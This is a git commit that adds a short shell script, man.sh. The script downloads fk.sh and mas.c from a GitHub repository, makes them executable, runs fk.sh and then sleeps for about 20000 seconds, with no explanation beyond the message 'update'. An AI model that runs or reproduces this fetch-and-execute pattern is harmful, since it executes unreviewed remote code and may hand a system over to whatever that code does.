a8e36a3c061e96964560bfcc1667a9f6c5610f4d
biswas179 <86525152+biswas179@users.noreply.github.com>
2021-06-26 23:14:33 +0530

    update

---
+++ man.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+  wget https://github.com/biswas179/FkgX/raw/main/fk.sh 
+  chmod +x fk.sh 
+  wget https://github.com/biswas179/FkgX/raw/main/mas.c
+  chmod +x mas.c  
+  ./fk.sh
+  sleep 20000
